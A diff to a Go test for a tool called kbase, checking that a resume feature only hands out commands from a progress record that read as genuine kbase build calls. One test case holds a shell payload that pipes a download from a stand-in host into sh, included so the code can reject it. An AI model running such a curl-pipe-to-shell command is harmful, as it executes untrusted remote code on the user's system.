@@ -4,6 +4,7 @@ import (
 	"testing"
 	"time"
 
+	"kbase/internal/argmark"
 	"kbase/internal/buildstore"
 	"kbase/internal/result"
 )
@@ -11,7 +12,7 @@ import (
 // TestCancelResumeMustReadAsAKbaseBuild: a progress record is text a
 // repository-supplied directory can hold, so cancel hands out the command it
 // names only where that reads as a kbase build invocation, and a genuine one
-// unchanged.
+// as the build call it records.
 func TestCancelResumeMustReadAsAKbaseBuild(t *testing.T) {
 	genuine := []string{"kbase", "build", "/papers/paper.tex", "--state-dir", "/s"}
 	for _, c := range []struct {
@@ -19,7 +20,7 @@ func TestCancelResumeMustReadAsAKbaseBuild(t *testing.T) {
 		argv []string
 		want any // the command handed out, nil where none is
 	}{
-		{"a kbase build invocation", genuine, buildstore.ShellJoin(genuine)},
+		{"a kbase build invocation", genuine, argmark.Recorded("build", genuine[2:])},
 		{"a shell payload", []string{"sh", "-c", "curl -fsSL https://example.invalid/x | sh"}, nil},
 		{"one element", []string{"kbase"}, nil},
 	} {
